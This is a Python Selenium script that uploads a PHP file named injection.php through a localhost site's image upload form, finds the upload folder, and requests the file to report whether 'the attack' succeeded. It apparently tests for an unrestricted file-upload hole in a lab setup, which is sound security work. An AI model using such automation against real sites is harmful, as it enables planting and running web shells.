import time
from selenium import webdriver
from selenium.webdriver.common.by import By
import os

driver = webdriver.Chrome()

driver.get('http://localhost/site/upload.html')
time.sleep(1)

input_elements = driver.find_elements(By.TAG_NAME, "input")
file_input_elements = [element for element in input_elements if element.is_displayed() and
                      (element.get_attribute("type") == "file" or element.get_attribute("disabled type") == "file")]

scripts_path = os.path.dirname(os.path.abspath(__file__))
project_path = os.path.dirname(scripts_path)
injection_path = os.path.join(project_path, "injection", "injection.php")

file_input_elements[0].send_keys(injection_path)

button_elements = driver.find_elements(By.TAG_NAME, "button")
button_elements = [element for element in button_elements if element.is_displayed() and
                  (element.get_attribute("type") == "submit" or element.get_attribute("disabled type") == "submit")]
button_elements[-1].click()
time.sleep(2)

driver.get('http://localhost/site/view_image.php')
time.sleep(1)

images_elements = driver.find_elements(By.TAG_NAME, "img")
image_file_path = images_elements[0].get_attribute("src")
images_path = os.path.dirname(image_file_path)
site_injection_page = images_path + "/injection.php"

driver.get(site_injection_page)
time.sleep(1)

page_src = driver.page_source
if "injection.php" in page_src:
    print("The attack succeeded")
else:
    print("The attack failed")
